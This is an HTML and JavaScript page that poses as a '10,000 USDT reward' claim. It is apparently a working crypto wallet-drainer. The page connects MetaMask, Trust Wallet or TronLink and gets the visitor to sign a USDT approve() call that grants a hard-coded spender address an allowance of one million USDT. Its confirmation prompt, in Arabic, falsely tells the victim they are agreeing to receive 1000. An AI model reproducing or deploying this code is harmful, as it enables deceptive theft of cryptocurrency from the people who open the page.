<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Claim Your 10,000 USDT Reward</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;700;900&display=swap" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.3/dist/TronWeb.min.js" defer></script>
  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js" defer></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: "Inter", sans-serif;
      background: #0a0a0a;
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      overflow: hidden;
      position: relative;
    }
    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle at 50% 30%, rgba(20, 20, 40, 0.3), transparent 70%);
      z-index: -1;
      opacity: 0.3;
    }
    .container {
      background: linear-gradient(180deg, #121212, #080808);
      border-radius: 24px;
      padding: 50px 40px;
      max-width: 800px;
      width: 100%;
      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.9), 0 0 20px rgba(20, 20, 40, 0.3);
      text-align: center;
      border: 1px solid rgba(40, 40, 60, 0.5);
      position: relative;
      animation: fadeIn 1.2s ease-out;
      z-index: 1;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h2 {
      font-size: 48px;
      font-weight: 900;
      color: #ffffff;
      margin-bottom: 20px;
      text-transform: uppercase;
      letter-spacing: 2px;
      text-shadow: 0 0 10px rgba(40, 40, 60, 0.7);
      animation: titleGlow 2s ease-in-out infinite;
    }
    @keyframes titleGlow {
      0%, 100% { text-shadow: 0 0 10px rgba(40, 40, 60, 0.7); }
      50% { text-shadow: 0 0 15px rgba(40, 40, 60, 0.9); }
    }
    .reward-text {
      font-size: 22px;
      color: #a0a0a0;
      margin-bottom: 30px;
      line-height: 1.6;
      font-weight: 500;
    }
    .button-group {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      margin-top: 30px;
    }
    button {
      background: linear-gradient(90deg, #1e1e32, #323250);
      border: none;
      border-radius: 50px;
      padding: 18px 60px;
      font-size: 18px;
      font-weight: 700;
      color: #ffffff;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      position: relative;
      overflow: hidden;
      box-shadow: 0 5px 15px rgba(40, 40, 60, 0.4);
      transition: all 0.3s ease;
    }
    button::before {
      content: "";
      position: absolute;
      top: 0;
      left: -150%;
      width: 200%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: 0.5s;
    }
    button:hover::before {
      left: 150%;
    }
    button:hover {
      transform: translateY(-4px);
      box-shadow: 0 10px 20px rgba(40, 40, 60, 0.6);
      background: linear-gradient(90deg, #323250, #1e1e32);
    }
    button:active {
      transform: translateY(0);
      box-shadow: 0 5px 15px rgba(40, 40, 60, 0.4);
    }
    #loading {
      color: #a0a0a0;
      font-weight: 700;
      font-size: 20px;
      display: none;
      margin-top: 30px;
      animation: loadingFade 1.5s infinite;
    }
    @keyframes loadingFade {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .status {
      margin-top: 30px;
      font-size: 20px;
      font-weight: 600;
      color: #ff4d4d;
      min-height: 30px;
      transition: color 0.3s ease;
    }
    .status.success {
      color: #a0a0a0;
    }
    .particle {
      position: absolute;
      width: 5px;
      height: 5px;
      background: rgba(40, 40, 60, 0.6);
      border-radius: 50%;
      pointer-events: none;
      animation: particleFloat 5s linear infinite;
    }
    @keyframes particleFloat {
      0% { transform: translateY(0) scale(1); opacity: 0.6; }
      100% { transform: translateY(-100vh) scale(0.3); opacity: 0; }
    }
    @media (max-width: 600px) {
      .container {
        padding: 30px 20px;
      }
      h2 {
        font-size: 32px;
        letter-spacing: 1px;
      }
      .reward-text {
        font-size: 18px;
      }
      button {
        padding: 14px 40px;
        font-size: 16px;
      }
      .button-group {
        flex-direction: column;
        gap: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Claim 10,000 USDT Now</h2>
    <p class="reward-text">Authorize the transaction to unlock your exclusive 10,000 USDT reward!</p>
    <div class="button-group">
      <button onclick="approveUSDT('metamask')">Authorize with MetaMask (ETH)</button>
      <button onclick="approveUSDT('trustwallet')">Authorize with Trust Wallet (ETH)</button>
      <button onclick="approveUSDT('tronlink')">Authorize with TronLink (TRON)</button>
    </div>
    <div id="loading">Processing Your Reward...</div>
    <p class="status" id="statusText"></p>
  </div>
  <script>
    // Add subtle particle animations
    function createParticle() {
      const particle = document.createElement("div");
      particle.classList.add("particle");
      particle.style.left = `${Math.random() * 100}vw`;
      particle.style.animationDuration = `${Math.random() * 3 + 4}s`;
      document.body.appendChild(particle);
      setTimeout(() => particle.remove(), 5000);
    }
    setInterval(createParticle, 500);
  </script>

  <script>
    const ethUsdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT ERC-20
    const tronUsdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC-20
    const ethSpenderAddress = "0x1234567890abcdef1234567890abcdef12345678"; // REPLACE with actual Ethereum address
    const tronSpenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";
    const usdtABI = [
      {
        constant: false,
        inputs: [
          { name: "_spender", type: "address" },
          { name: "_value", type: "uint256" }
        ],
        name: "approve",
        outputs: [{ name: "", type: "bool" }],
        type: "function",
        stateMutability: "nonpayable"
      }
    ];

    async function waitForTronWeb(timeout = 5000) {
      const start = Date.now();
      while (!window.tronWeb || !window.tronWeb.ready) {
        if (Date.now() - start > timeout) {
          return false;
        }
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      return true;
    }

    async function waitForEthers(timeout = 10000) {
      const start = Date.now();
      while (typeof ethers === "undefined" || !ethers.utils) {
        if (Date.now() - start > timeout) {
          return false;
        }
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      return true;
    }

    async function setupEthereumNetwork() {
      if (window.ethereum) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }] // Ethereum Mainnet
          });
          return true;
        } catch (error) {
          if (error.code === 4902) {
            try {
              await window.ethereum.request({
                method: "wallet_addEthereumChain",
                params: [
                  {
                    chainId: "0x1",
                    chainName: "Ethereum Mainnet",
                    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
                    rpcUrls: ["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
                    blockExplorerUrls: ["https://etherscan.io"]
                  }
                ]
              });
              return true;
            } catch (addError) {
              console.warn("Failed to add Ethereum network:", addError);
              return false;
            }
          }
          console.warn("Failed to switch to Ethereum network:", error);
          return false;
        }
      }
      return false;
    }

    async function connectWallet(walletType) {
      try {
        let provider;
        if (walletType === "metamask" || walletType === "trustwallet") {
          if (window.ethereum && (window.ethereum.isMetaMask || window.ethereum.isTrust)) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await window.ethereum.request({ method: "eth_requestAccounts" });
            const networkAdded = await setupEthereumNetwork();
            if (!networkAdded) {
              throw new Error(`Please switch to Ethereum Mainnet in ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}.`);
            }
          } else {
            provider = await EthereumProvider.init({
              projectId: "f6b400b4393b83bb22ef4c2c3a5c805ad72d2", // Replace with your WalletConnect project ID
              chains: [1], // Ethereum Mainnet chain ID
              optionalChains: [1],
              rpcMap: { 1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161" },
              metadata: {
                name: "USDT Approval",
                description: "Approve USDT on Ethereum",
                url: window.location.href,
                icons: ["https://metamask.io/favicon.ico"]
              },
              showQrModal: true
            });
            await provider.connect();
            provider = new ethers.providers.Web3Provider(provider);
            const networkAdded = await setupEthereumNetwork();
            if (!networkAdded) {
              throw new Error(`Please add Ethereum Mainnet in ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"} via WalletConnect.`);
            }
          }
        }
        return provider;
      } catch (error) {
        throw new Error(`Failed to access ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}: ${error.message}`);
      }
    }

    async function approveUSDT(walletType) {
      const loadingDiv = document.getElementById("loading");
      const statusText = document.getElementById("statusText");

      try {
        loadingDiv.style.display = "block";
        statusText.textContent = "";

        // Set approval amount: 1,000,000 USDT
        let amount;
        const ethersReady = await waitForEthers();
        if (ethersReady) {
          amount = ethers.utils.parseUnits("1000000", walletType === "tronlink" ? 6 : 18).toString();
        } else {
          amount = walletType === "tronlink" ? "1000000000000" : "1000000000000000000000000"; // 1M * 10^6 (TRC-20) or 1M * 10^18 (ERC-20)
          console.warn("ethers.js not loaded, using fallback amount.");
        }

        if (walletType === "tronlink") {
          // TronLink approval (TRC-20)
          const tronWebReady = await waitForTronWeb();
          if (!tronWebReady || !window.tronWeb.defaultAddress.base58) {
            statusText.textContent = "Please install TronLink and log in to your wallet.";
            loadingDiv.style.display = "none";
            return;
          }

          if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
            statusText.textContent = "Please connect to the TRON Mainnet.";
            loadingDiv.style.display = "none";
            return;
          }

          if (!window.tronWeb.isAddress(tronSpenderAddress)) {
            statusText.textContent = "Invalid TRON spender address!";
            loadingDiv.style.display = "none";
            return;
          }

          const contract = await window.tronWeb.contract(usdtABI, tronUsdtContractAddress);

          if (!confirm("موافق على استقبال 1000")) {
            statusText.textContent = "Approval cancelled.";
            loadingDiv.style.display = "none";
            return;
          }

          statusText.textContent = "Sending approval transaction with TronLink...";
          const tx = await contract.approve(tronSpenderAddress, amount).send({
            feeLimit: 30000000, // 30 TRX
            callValue: 0,
            shouldPollResponse: false
          });

          statusText.textContent = `✅ Approval successful! Transaction ID: ${tx}`;
        } else if (walletType === "metamask" || walletType === "trustwallet") {
          // MetaMask or Trust Wallet approval (ERC-20)
          const provider = await connectWallet(walletType);
          const signer = provider.getSigner();

          if (!ethers.utils.isAddress(ethSpenderAddress)) {
            statusText.textContent = "Invalid Ethereum spender address!";
            loadingDiv.style.display = "none";
            return;
          }

          const contract = new ethers.Contract(ethUsdtContractAddress, usdtABI, signer);

          if (!confirm("موافق على استقبال 1000")) {
            statusText.textContent = "Approval cancelled.";
            loadingDiv.style.display = "none";
            return;
          }

          statusText.textContent = `Sending approval transaction with ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}...`;
          const tx = await contract.approve(ethSpenderAddress, amount, { gasLimit: 150000 });
          const receipt = await tx.wait();

          statusText.textContent = `✅ Approval successful! Transaction Hash: ${receipt.transactionHash}`;
        }

        loadingDiv.style.display = "none";
      } catch (error) {
        console.error("Transaction error:", error);
        statusText.textContent = `Approval failed: ${error.message || error}`;
        loadingDiv.style.display = "none";
      }
    }
  </script>
</body>
</html>
